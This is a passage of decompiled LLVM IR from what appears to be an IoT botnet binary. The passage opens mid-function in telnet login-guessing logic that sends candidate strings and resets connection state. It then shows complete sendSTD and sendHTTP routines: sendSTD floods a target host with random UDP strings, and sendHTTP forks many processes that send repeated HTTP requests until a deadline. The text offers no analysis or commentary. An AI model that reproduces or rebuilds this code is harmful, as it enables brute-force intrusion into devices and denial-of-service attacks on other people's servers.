  store i32 %v1_804a4a1, i32* %eax.global-to-local, align 4
  %v2_804b2aa = load i32, i32* %v1_804a4a4, align 4
  store i32 %v2_804b2aa, i32* %eax.global-to-local, align 4
  %v1_804b2ac = add i32 %v2_804b2aa, 7
  store i32 %v1_804b2ac, i32* @ebx, align 4
  %v0_804b2af = load i32, i32* @esp, align 4
  %v1_804b2af = inttoptr i32 %v0_804b2af to i32*
  store i32 0, i32* %v1_804b2af, align 4
  %v1_804b2b6 = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804b2b6 = call i32 @__GI_time(i32* %v1_804b2b6)
  store i32 %v2_804b2b6, i32* %eax.global-to-local, align 4
  %v0_804b2bb = load i32, i32* @ebx, align 4
  %v7_804b2bb = icmp ult i32 %v0_804b2bb, %v2_804b2b6
  %v1_804b2bd = icmp eq i1 %v7_804b2bb, false
  br i1 %v1_804b2bd, label %dec_label_pc_804b459, label %dec_label_pc_804b2c3

dec_label_pc_804b2c3:                             ; preds = %dec_label_pc_804b28f
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804b2dc = load i32, i32* @esp, align 4
  %v2_804b2dc = inttoptr i32 %v1_804b2dc to i32*
  store i32 %v2_804a49f, i32* %v2_804b2dc, align 4
  %v1_804b2df = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804b2df, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804b2e9:                             ; preds = %dec_label_pc_804a4d7
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804b2ec = load i32, i32* @esp, align 4
  %v1_804b2ec = inttoptr i32 %v0_804b2ec to i32*
  store i32 0, i32* %v1_804b2ec, align 4
  %v1_804b2f3 = inttoptr i32 %v6_804a4ed to i32*
  %v2_804b2f3 = call i32 @__GI_time(i32* %v1_804b2f3)
  %v0_804b2fd = load i32, i32* @ebx, align 4
  %v2_804b30d = mul i32 %v0_804b2fd, 28
  %v1_804b311 = add i32 %v2_804b0d6, %v2_804b30d
  %v2_804b314 = inttoptr i32 %v1_804b311 to i32*
  store i32 %v2_804b2f3, i32* %v2_804b314, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v3_804b32c = inttoptr i32 %v2_804a49f to i32*
  %v4_804b32c = load i32, i32* %v3_804b32c, align 4
  store i32 %v4_804b32c, i32* %eax.global-to-local, align 4
  %v0_804b32f = load i32, i32* @esp, align 4
  %v1_804b32f = add i32 %v0_804b32f, 12
  %v2_804b32f = inttoptr i32 %v1_804b32f to i32*
  store i32 16384, i32* %v2_804b32f, align 4
  %v0_804b337 = load i32, i32* @esp, align 4
  %v1_804b337 = add i32 %v0_804b337, 8
  %v2_804b337 = inttoptr i32 %v1_804b337 to i32*
  store i32 4, i32* %v2_804b337, align 4
  %v0_804b33f = load i32, i32* @esp, align 4
  %v1_804b33f = add i32 %v0_804b33f, 4
  %v2_804b33f = inttoptr i32 %v1_804b33f to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8055d75.59 to i32), i32* %v2_804b33f, align 4
  %v0_804b347 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b347 = load i32, i32* @esp, align 4
  %v2_804b347 = inttoptr i32 %v1_804b347 to i32*
  store i32 %v0_804b347, i32* %v2_804b347, align 4
  %v4_804b34a = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3a8, i32 %v6_804a4ed)
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804b365 = load i32, i32* %v3_804b32c, align 4
  store i32 %v4_804b365, i32* %eax.global-to-local, align 4
  %v0_804b368 = load i32, i32* @esp, align 4
  %v1_804b368 = add i32 %v0_804b368, 12
  %v2_804b368 = inttoptr i32 %v1_804b368 to i32*
  store i32 16384, i32* %v2_804b368, align 4
  %v0_804b370 = load i32, i32* @esp, align 4
  %v1_804b370 = add i32 %v0_804b370, 8
  %v2_804b370 = inttoptr i32 %v1_804b370 to i32*
  store i32 7, i32* %v2_804b370, align 4
  %v0_804b378 = load i32, i32* @esp, align 4
  %v1_804b378 = add i32 %v0_804b378, 4
  %v2_804b378 = inttoptr i32 %v1_804b378 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8055d7a.60 to i32), i32* %v2_804b378, align 4
  %v0_804b380 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b380 = load i32, i32* @esp, align 4
  %v2_804b380 = inttoptr i32 %v1_804b380 to i32*
  store i32 %v0_804b380, i32* %v2_804b380, align 4
  %v4_804b383 = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3a8, i32 %v6_804a4ed)
  %v0_804b388 = load i32, i32* bitcast ([415 x i8]** @global_var_80580d4.62 to i32*), align 4
  %v5_804b392 = inttoptr i32 %v0_804b388 to i8*
  %v1_804b398 = and i32 %v0_804b388, -256
  store i32 %v1_804b398, i32* %eax.global-to-local, align 4
  store i32 %v0_804b388, i32* @edi, align 4
  %v3_804b3a1 = call i32 @_strlen(i8* %v5_804b392)
  store i32 %v3_804b3a1, i32* @ebx, align 4
  %v0_804b3aa = load i32, i32* bitcast ([415 x i8]** @global_var_80580d4.62 to i32*), align 4
  store i32 %v0_804b3aa, i32* @esi, align 4
  store i32 %v1_804a48f, i32* %edx.global-to-local, align 4
  store i32 %v2_804a49d, i32* %eax.global-to-local, align 4
  %v4_804b3c6 = load i32, i32* %v3_804b32c, align 4
  store i32 %v4_804b3c6, i32* %eax.global-to-local, align 4
  %v0_804b3c9 = load i32, i32* @esp, align 4
  %v1_804b3c9 = add i32 %v0_804b3c9, 12
  %v2_804b3c9 = inttoptr i32 %v1_804b3c9 to i32*
  store i32 16384, i32* %v2_804b3c9, align 4
  %v0_804b3d1 = load i32, i32* @ebx, align 4
  %v1_804b3d1 = load i32, i32* @esp, align 4
  %v2_804b3d1 = add i32 %v1_804b3d1, 8
  %v3_804b3d1 = inttoptr i32 %v2_804b3d1 to i32*
  store i32 %v0_804b3d1, i32* %v3_804b3d1, align 4
  %v0_804b3d5 = load i32, i32* @esi, align 4
  %v1_804b3d5 = load i32, i32* @esp, align 4
  %v2_804b3d5 = add i32 %v1_804b3d5, 4
  %v3_804b3d5 = inttoptr i32 %v2_804b3d5 to i32*
  store i32 %v0_804b3d5, i32* %v3_804b3d5, align 4
  %v0_804b3d9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b3d9 = load i32, i32* @esp, align 4
  %v2_804b3d9 = inttoptr i32 %v1_804b3d9 to i32*
  store i32 %v0_804b3d9, i32* %v2_804b3d9, align 4
  %v5_804b3dc = call i32 @__libc_send(i32 %v0_804b388, i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804a3a8)
  store i32 %v5_804b3dc, i32* %eax.global-to-local, align 4
  %v2_804b3e1 = icmp slt i32 %v5_804b3dc, 0
  %v1_804b3e3 = icmp eq i1 %v2_804b3e1, false
  store i32 %v1_804a48f, i32* @edx, align 4
  br i1 %v1_804b3e3, label %dec_label_pc_804b408, label %dec_label_pc_804b3e5

dec_label_pc_804b3e5:                             ; preds = %dec_label_pc_804b2e9
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804b3fe = load i32, i32* @esp, align 4
  %v2_804b3fe = inttoptr i32 %v1_804b3fe to i32*
  store i32 %v2_804a49f, i32* %v2_804b3fe, align 4
  %v2_804b401 = call i32 @reset_telstate(i32 %v0_804b388)
  store i32 %v2_804b401, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804b408:                             ; preds = %dec_label_pc_804b2e9
  store i32 %v1_804a4a1, i32* %eax.global-to-local, align 4
  %v2_804b423 = load i32, i32* %v1_804a4a4, align 4
  store i32 %v2_804b423, i32* %eax.global-to-local, align 4
  %v1_804b425 = add i32 %v2_804b423, 25
  store i32 %v1_804b425, i32* @ebx, align 4
  %v0_804b428 = load i32, i32* @esp, align 4
  %v1_804b428 = inttoptr i32 %v0_804b428 to i32*
  store i32 0, i32* %v1_804b428, align 4
  %tmp38 = inttoptr i32 %v0_804b388 to i32*
  %v3_804b42f = call i32 @__GI_time(i32* %tmp38)
  store i32 %v3_804b42f, i32* %eax.global-to-local, align 4
  %v0_804b434 = load i32, i32* @ebx, align 4
  %v7_804b434 = icmp ult i32 %v0_804b434, %v3_804b42f
  %v1_804b436 = icmp eq i1 %v7_804b434, false
  br i1 %v1_804b436, label %dec_label_pc_804b459, label %dec_label_pc_804b438

dec_label_pc_804b438:                             ; preds = %dec_label_pc_804b408
  store i32 %v1_804a48f, i32* @edx, align 4
  store i32 %v2_804a49f, i32* %eax.global-to-local, align 4
  %v1_804b451 = load i32, i32* @esp, align 4
  %v2_804b451 = inttoptr i32 %v1_804b451 to i32*
  store i32 %v2_804a49f, i32* %v2_804b451, align 4
  %v2_804b454 = call i32 @reset_telstate(i32 %v0_804b388)
  store i32 %v2_804b454, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b459

dec_label_pc_804b459:                             ; preds = %dec_label_pc_804a4d7, %dec_label_pc_804b408, %dec_label_pc_804b28f, %dec_label_pc_804aea2, %dec_label_pc_804ac0f, %dec_label_pc_804aacf, %dec_label_pc_804a712, %dec_label_pc_804b3e5, %dec_label_pc_804b2c3, %dec_label_pc_804b269, %dec_label_pc_804b1ae, %dec_label_pc_804b180, %dec_label_pc_804b106, %dec_label_pc_804b021, %dec_label_pc_804affb, %dec_label_pc_804af98, %dec_label_pc_804aed6, %dec_label_pc_804ae74, %dec_label_pc_804ae46, %dec_label_pc_804ad8e, %dec_label_pc_804ad68, %dec_label_pc_804ad05, %dec_label_pc_804ac43, %dec_label_pc_804abe1, %dec_label_pc_804abb3, %dec_label_pc_804ab03, %dec_label_pc_804aaa9, %dec_label_pc_804aa0f, %dec_label_pc_804a9e9, %dec_label_pc_804a895, %dec_label_pc_804a86f, %dec_label_pc_804a6f2, %dec_label_pc_804a6b3, %dec_label_pc_804b438
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.247, %dec_label_pc_804a4d7 ], [ %stack_var_-624.247, %dec_label_pc_804b408 ], [ %stack_var_-624.247, %dec_label_pc_804b438 ], [ %stack_var_-624.247, %dec_label_pc_804b3e5 ], [ %stack_var_-624.247, %dec_label_pc_804b28f ], [ %stack_var_-624.247, %dec_label_pc_804b2c3 ], [ %stack_var_-624.247, %dec_label_pc_804b269 ], [ %stack_var_-624.247, %dec_label_pc_804b1ae ], [ %stack_var_-624.247, %dec_label_pc_804b180 ], [ %stack_var_-624.247, %dec_label_pc_804b106 ], [ %stack_var_-624.247, %dec_label_pc_804b021 ], [ %stack_var_-624.247, %dec_label_pc_804affb ], [ %stack_var_-624.247, %dec_label_pc_804af98 ], [ %stack_var_-624.247, %dec_label_pc_804aea2 ], [ %stack_var_-624.247, %dec_label_pc_804aed6 ], [ %stack_var_-624.247, %dec_label_pc_804ae74 ], [ %stack_var_-624.247, %dec_label_pc_804ae46 ], [ %v4_804ac87, %dec_label_pc_804ad8e ], [ %v4_804ac87, %dec_label_pc_804ad68 ], [ %v4_804ac87, %dec_label_pc_804ad05 ], [ %stack_var_-624.247, %dec_label_pc_804ac0f ], [ %stack_var_-624.247, %dec_label_pc_804ac43 ], [ %stack_var_-624.247, %dec_label_pc_804abe1 ], [ %stack_var_-624.247, %dec_label_pc_804abb3 ], [ %stack_var_-624.247, %dec_label_pc_804aacf ], [ %stack_var_-624.247, %dec_label_pc_804ab03 ], [ %stack_var_-624.247, %dec_label_pc_804aaa9 ], [ %stack_var_-624.247, %dec_label_pc_804aa0f ], [ %stack_var_-624.247, %dec_label_pc_804a9e9 ], [ %stack_var_-624.247, %dec_label_pc_804a712 ], [ %stack_var_-624.247, %dec_label_pc_804a895 ], [ %stack_var_-624.247, %dec_label_pc_804a86f ], [ %stack_var_-624.247, %dec_label_pc_804a6f2 ], [ %stack_var_-624.247, %dec_label_pc_804a6b3 ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.248, %dec_label_pc_804a4d7 ], [ %stack_var_-628.248, %dec_label_pc_804b408 ], [ %stack_var_-628.248, %dec_label_pc_804b438 ], [ %stack_var_-628.248, %dec_label_pc_804b3e5 ], [ %stack_var_-628.248, %dec_label_pc_804b28f ], [ %stack_var_-628.248, %dec_label_pc_804b2c3 ], [ %stack_var_-628.248, %dec_label_pc_804b269 ], [ %stack_var_-628.248, %dec_label_pc_804b1ae ], [ %stack_var_-628.248, %dec_label_pc_804b180 ], [ %stack_var_-628.248, %dec_label_pc_804b106 ], [ %v4_804af1a, %dec_label_pc_804b021 ], [ %v4_804af1a, %dec_label_pc_804affb ], [ %v4_804af1a, %dec_label_pc_804af98 ], [ %stack_var_-628.248, %dec_label_pc_804aea2 ], [ %stack_var_-628.248, %dec_label_pc_804aed6 ], [ %stack_var_-628.248, %dec_label_pc_804ae74 ], [ %stack_var_-628.248, %dec_label_pc_804ae46 ], [ %stack_var_-628.248, %dec_label_pc_804ad8e ], [ %stack_var_-628.248, %dec_label_pc_804ad68 ], [ %stack_var_-628.248, %dec_label_pc_804ad05 ], [ %stack_var_-628.248, %dec_label_pc_804ac0f ], [ %stack_var_-628.248, %dec_label_pc_804ac43 ], [ %stack_var_-628.248, %dec_label_pc_804abe1 ], [ %stack_var_-628.248, %dec_label_pc_804abb3 ], [ %stack_var_-628.248, %dec_label_pc_804aacf ], [ %stack_var_-628.248, %dec_label_pc_804ab03 ], [ %stack_var_-628.248, %dec_label_pc_804aaa9 ], [ %stack_var_-628.248, %dec_label_pc_804aa0f ], [ %stack_var_-628.248, %dec_label_pc_804a9e9 ], [ %stack_var_-628.248, %dec_label_pc_804a712 ], [ %stack_var_-628.248, %dec_label_pc_804a895 ], [ %stack_var_-628.248, %dec_label_pc_804a86f ], [ %stack_var_-628.248, %dec_label_pc_804a6f2 ], [ %stack_var_-628.248, %dec_label_pc_804a6b3 ]
  %v4_804b459 = add nuw nsw i32 %storemerge49, 1
  store i32 %v4_804b459, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804b459, %arg2
  br i1 %exitcond, label %dec_label_pc_804a47d, label %dec_label_pc_804a489

; uselistorder directives
  uselistorder i32 %v4_804b459, { 1, 2, 0 }
  uselistorder i32 %stack_var_-628.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32* %v1_804b0ba, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804b03a, { 1, 0 }
  uselistorder i32 %v4_804af1a, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804ae8d, { 1, 0 }
  uselistorder i32 %v0_804ada7, { 1, 0 }
  uselistorder i32 %v4_804ac87, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804abfa, { 1, 0 }
  uselistorder i32 %v5_804a974, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804a913, { 1, 0 }
  uselistorder i32 %v2_804a8f7, { 1, 0 }
  uselistorder i32 %v2_804a762, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_804a555, { 1, 0 }
  uselistorder i32 %v6_804a4ed, { 9, 10, 11, 7, 8, 5, 6, 4, 2, 3, 1, 0, 13, 12, 14 }
  uselistorder i32* %v1_804a4a4, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804a4a1, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804a49f, { 50, 49, 52, 51, 53, 39, 38, 41, 40, 42, 44, 43, 45, 46, 47, 48, 34, 33, 36, 35, 37, 28, 27, 29, 30, 31, 32, 23, 22, 25, 24, 26, 17, 16, 18, 19, 20, 21, 9, 8, 11, 10, 12, 14, 13, 15, 0, 2, 1, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804a49d, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 5, 41, 42, 7, 43, 8, 44, 9 }
  uselistorder i32 %v1_804a48f, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %stack_var_-624.247, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %stack_var_-628.248, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %storemerge49, { 2, 3, 4, 5, 6, 8, 7, 0, 1 }
  uselistorder i32 %v4_804a46c, { 1, 2, 0 }
  uselistorder i32 %storemerge259, { 1, 0 }
  uselistorder i32 %v2_804a3c5, { 1, 0 }
  uselistorder i32 %v2_804a3a8, { 14, 13, 12, 15, 17, 16, 18, 19, 22, 21, 20, 5, 6, 7, 8, 23, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 5, 4, 3, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 7, 0, 10, 9, 4, 6, 8, 2, 1, 5, 11, 3, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 45, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32* %eax.global-to-local, { 200, 3, 2, 6, 4, 5, 8, 7, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 24, 22, 23, 26, 25, 29, 27, 28, 31, 30, 32, 33, 34, 35, 38, 36, 37, 39, 40, 43, 41, 42, 46, 44, 45, 49, 47, 48, 51, 50, 52, 53, 56, 54, 57, 55, 58, 59, 60, 62, 61, 65, 63, 64, 66, 67, 68, 69, 70, 71, 73, 72, 76, 74, 75, 81, 78, 82, 79, 80, 83, 84, 77, 85, 86, 87, 90, 88, 91, 89, 92, 93, 94, 96, 95, 99, 97, 98, 100, 101, 102, 103, 104, 105, 107, 106, 110, 108, 109, 115, 112, 116, 113, 114, 117, 118, 111, 119, 120, 121, 123, 122, 126, 124, 125, 128, 127, 131, 129, 130, 132, 133, 134, 135, 136, 137, 139, 138, 140, 141, 142, 144, 143, 145, 146, 147, 148, 149, 152, 150, 151, 154, 153, 155, 156, 159, 157, 158, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 178, 193, 194, 195, 196, 197, 198, 199, 1, 201, 202, 215, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 0, 216, 217, 218, 219, 221, 220 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804b459, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804a4d7, { 1, 0 }
  uselistorder label %dec_label_pc_804a489, { 1, 0 }
  uselistorder label %dec_label_pc_804a47d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a46c, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b46d = load i32, i32* @ebp, align 4
  store i32 %v0_804b46d, i32* %stack_var_-4, align 4
  %v4_804b46d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804b46d, i32* @ebp, align 4
  %v4_804b48d = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804b49c = call i32 @__GI_time(i32* null)
  %v1_804b4aa = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804b4b2 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804b4d3 = add i32 %v1_804b4aa, 12
  %v2_804b4d3 = inttoptr i32 %v1_804b4d3 to i32*
  %v3_804b4d3 = load i32, i32* %v2_804b4d3, align 4
  %v2_804b4db = ptrtoint i32* %stack_var_-36 to i32
  %v1_804b4e1 = add i32 %v1_804b4aa, 16
  %v2_804b4e1 = inttoptr i32 %v1_804b4e1 to i32*
  %v3_804b4e1 = load i32, i32* %v2_804b4e1, align 4
  %v1_804b4e4 = inttoptr i32 %v3_804b4e1 to i32*
  %v2_804b4e4 = load i32, i32* %v1_804b4e4, align 4
  %v4_804b4f1 = call i32 @bcopy(i32 %v2_804b4e4, i32 %v2_804b4db, i32 %v3_804b4d3)
  %v1_804b4f9 = add i32 %v1_804b4aa, 8
  %v2_804b4f9 = inttoptr i32 %v1_804b4f9 to i32*
  %v3_804b4f9 = load i32, i32* %v2_804b4f9, align 4
  %v1_804b4fc = urem i32 %v3_804b4f9, 65536
  store i32 %v1_804b4fc, i32* %stack_var_-40, align 4
  %v4_804b52f = bitcast i32* %stack_var_-184 to i16*
  %v5_804b5d7 = add i32 %v2_804b49c, %arg3
  br label %dec_label_pc_804b514

dec_label_pc_804b514:                             ; preds = %dec_label_pc_804b5fc, %entry
  %storemerge = phi i32 [ %v4_804b5fc, %dec_label_pc_804b5fc ], [ 0, %entry ]
  %v5_804b52f = call i32 @memcpy(i16* %v4_804b52f, i32 ptrtoint ([36 x i8*]* @global_var_8055f20.99 to i32), i32 144)
  store i32 %v5_804b52f, i32* @eax, align 4
  %v0_804b534 = call i32 @random()
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_804b5fc, label %dec_label_pc_804b58a

dec_label_pc_804b58a:                             ; preds = %dec_label_pc_804b514
  %v0_804b57a = load i32, i32* @ebp, align 4
  %v3_804b57a = add i32 %v0_804b57a, -180
  %v2_804b54f = udiv i32 %v0_804b534, 36
  %tmp29 = mul nsw i32 %v2_804b54f, -4
  %v2_804b56c = add i32 %v0_804b534, %tmp29
  %v2_804b57a = mul i32 %v2_804b56c, 4
  %v4_804b57a = add i32 %v3_804b57a, %v2_804b57a
  %v5_804b57a = inttoptr i32 %v4_804b57a to i32*
  %v6_804b57a = load i32, i32* %v5_804b57a, align 4
  %v5_804b5a7 = call i32 @__libc_send(i32 %v4_804b48d, i32 %v6_804b57a, i32 65, i32 0)
  %v4_804b5c1 = call i32 @__libc_connect(i32 %v4_804b48d, i32 %v2_804b4b2, i32 16)
  %v2_804b5cd = call i32 @__GI_time(i32* null)
  %v5_804b5dc = icmp slt i32 %v2_804b5cd, %v5_804b5d7
  br i1 %v5_804b5dc, label %dec_label_pc_804b5fc, label %dec_label_pc_804b5de

dec_label_pc_804b5de:                             ; preds = %dec_label_pc_804b58a
  %v1_804b5e4 = call i32 @__libc_close(i32 %v4_804b48d)
  %v1_804b5f0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804b5fc:                             ; preds = %dec_label_pc_804b58a, %dec_label_pc_804b514
  %stack_var_-12.0 = phi i32 [ %storemerge, %dec_label_pc_804b514 ], [ 0, %dec_label_pc_804b58a ]
  %v4_804b5fc = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_804b514

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804b4aa, { 1, 0, 2 }
  uselistorder i32 %v4_804b48d, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-541 = alloca i32, align 4
  %stack_var_-540 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804b607 = load i32, i32* @edi, align 4
  %v0_804b608 = load i32, i32* @ebx, align 4
  store i32 %v0_804b608, i32* %stack_var_-12, align 4
  %v2_804b620 = call i32 @__GI_time(i32* null)
  %v5_804b625 = add i32 %v2_804b620, %arg5
  %v2_804b6b3 = ptrtoint i32* %stack_var_-540 to i32
  %v4_804b706 = bitcast i32* %stack_var_-540 to i8*
  store i32 0, i32* @eax, align 4
  %v5_804b77e34 = icmp sgt i32 %arg6, 0
  br i1 %v5_804b77e34, label %dec_label_pc_804b63e, label %dec_label_pc_804b784

dec_label_pc_804b63e:                             ; preds = %entry, %dec_label_pc_804b775
  %storemerge35 = phi i32 [ %v4_804b775, %dec_label_pc_804b775 ], [ 0, %entry ]
  %v0_804b63e = call i32 @random()
  %v2_804b661 = sdiv i32 %v0_804b63e, 36
  store i32 %v2_804b661, i32* @ebx, align 4
  %tmp = mul i32 %v2_804b661, -36
  %v2_804b67d = add i32 %v0_804b63e, %tmp
  store i32 %v2_804b67d, i32* @edi, align 4
  %v5_804b6bc = call i32 @sprintf(i32 %v2_804b6b3, i32 ptrtoint ([64 x i8]* @global_var_8055fb0.100 to i32), i32 %arg1, i32 %arg4)
  %v1_804b6c1 = call i32 @__libc_fork(i32 %v2_804b6b3)
  %v1_804b6c6 = icmp eq i32 %v1_804b6c1, 0
  br i1 %v1_804b6c6, label %dec_label_pc_804b775, label %dec_label_pc_804b754

dec_label_pc_804b6d3:                             ; preds = %dec_label_pc_804b754
  %v4_804b6e4 = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v4_804b6ec = icmp eq i32 %v4_804b6e4, 0
  br i1 %v4_804b6ec, label %dec_label_pc_804b754, label %dec_label_pc_804b6f2

dec_label_pc_804b6f2:                             ; preds = %dec_label_pc_804b6d3
  store i1 false, i1* @df, align 1
  store i32 %v2_804b6b3, i32* @edi, align 4
  %v3_804b70c = call i32 @_strlen(i8* %v4_804b706)
  %v5_804b727 = call i32 @__libc_write(i32 %v4_804b6e4, i32* nonnull %stack_var_-540, i32 %v3_804b70c)
  %v5_804b744 = call i32 @__libc_read(i32 %v4_804b6e4, i32* nonnull %stack_var_-541, i32 1)
  %v1_804b74f = call i32 @__libc_close(i32 %v4_804b6e4)
  br label %dec_label_pc_804b754

dec_label_pc_804b754:                             ; preds = %dec_label_pc_804b6d3, %dec_label_pc_804b6f2, %dec_label_pc_804b63e
  %v2_804b75b = call i32 @__GI_time(i32* null)
  store i32 %v2_804b75b, i32* @eax, align 4
  %v5_804b763 = icmp slt i32 %v2_804b75b, %v5_804b625
  br i1 %v5_804b763, label %dec_label_pc_804b6d3, label %dec_label_pc_804b769

dec_label_pc_804b769:                             ; preds = %dec_label_pc_804b754
  %v1_804b770 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804b775

dec_label_pc_804b775:                             ; preds = %dec_label_pc_804b63e, %dec_label_pc_804b769
  %v4_804b775 = add nuw nsw i32 %storemerge35, 1
  store i32 %v4_804b775, i32* @eax, align 4
  %exitcond = icmp eq i32 %v4_804b775, %arg6
  br i1 %exitcond, label %dec_label_pc_804b784, label %dec_label_pc_804b63e

dec_label_pc_804b784:                             ; preds = %dec_label_pc_804b775, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_804b775 ]
  %v2_804b78a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b78a, i32* @ebx, align 4
  store i32 %v0_804b607, i32* @edi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804b775, { 1, 2, 0 }
